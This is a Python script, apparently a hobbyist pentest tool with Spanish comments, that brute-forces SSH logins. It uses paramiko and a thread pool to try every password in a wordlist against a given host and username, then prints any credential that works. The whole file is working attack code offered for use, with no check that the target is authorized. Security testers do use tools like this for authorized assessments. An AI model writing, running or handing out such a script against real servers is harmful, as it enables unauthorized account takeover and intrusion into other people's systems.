import paramiko
import os 
import socket
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
import threading
import time

##Se limpia la pantalla y se imprime el nombre
os.system("cls" if os.name == "nt" else "clear")
print(r"""
 ____ ____  _   _                                                 
/ ___/ ___|| | | |                                                
\___ \___ \| |_| |                                                
 ___) |__) |  _  |                                                
|____/____/|_| |_| _____ _____ _____ ___  ____   ____ _____   
| __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____| 
|  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|  
| |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___ 
|____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____|

      by educhnn.
""")



#----------------Argumentos--------------------------
parser = argparse.ArgumentParser(description="SSH BRUTEFORCE")
parser.add_argument("-w","--wordlist",help="Wordlist", required=True)
parser.add_argument("-i", "--ip",help="Host", required=True)
parser.add_argument("-u", "--user",help="Username", required=True)
parser.add_argument("-t", "--threads", help="Threads",type=int,default=4)
args = parser.parse_args()
#---------------------------------------------------

#Se guardan las variables
host = args.ip
username = args.user
passwords = args.wordlist   

#Se busca la wordlist
if not os.path.isfile(passwords):
    print(f"[!]FILE '{passwords}' NOT FOUND")
    sys.exit(1)    

#Variable global para detener los hilos
found = threading.Event()

#Funcion
def ssh_bruteforce(password):
    if found.is_set():
        return
    
    password = password.strip()

    #Se crea el cliente
    client = paramiko.SSHClient()    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try: #Se intenta la conexión si es exitosa enseña el usuario y la contraseña
        time.sleep(0.2)  # Pausa para evitar saturar el SSH
        client.connect(
            hostname=host, 
            username=username, 
            password=password, 
            timeout=2, 
            allow_agent=False, 
            look_for_keys=False
        )            

        print(f"[+]FOUND: {username}@{host}:{password}")
        found.set()
    except paramiko.AuthenticationException:
        pass #Si la contraseña es incorrecta no hace nada y sigue el codigo
    except socket.gaierror:
        print(f"[!] HOST ERROR: {host}")
        found.set()
        return #Si el scoket presenta un error se muestra en pantalla y se cierra el programa 
    except socket.timeout:
        pass
    except paramiko.SSHException:
        pass
    finally:
        client.close()

#Se abre la wordlist
with open(args.wordlist,"r", encoding="UTF-8") as wl:        
    with ThreadPoolExecutor(max_workers=args.threads)as ex:
        ex.map(ssh_bruteforce, wl)
        
        
if not found.is_set():
    print("[!] PASSWORD NOT FOUND")